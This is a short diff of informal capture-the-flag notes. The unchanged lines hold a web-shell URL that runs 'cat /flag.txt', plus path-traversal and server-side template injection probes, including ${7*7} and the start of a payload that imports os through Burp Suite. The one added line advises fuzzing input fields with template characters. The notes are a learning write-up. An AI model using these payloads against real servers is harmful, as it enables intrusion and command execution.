@@ -35,6 +35,7 @@ http://35.198.135.192:30881/files/bolt.php?cmd=cat%20/flag.txt
 path traversal vulnerability
 ///shark///
 curl -I url   from here we will get that it is vulnerable to ssti and is based on python sever located in Werkzeug.
+Fuzzing the target by employing a payload that includes special characters often used by template engines in all data fields is a recommended approach.
 ${7*7}
 we should go tu burpsuite. submit anything. and than we add to name=<%
 import os
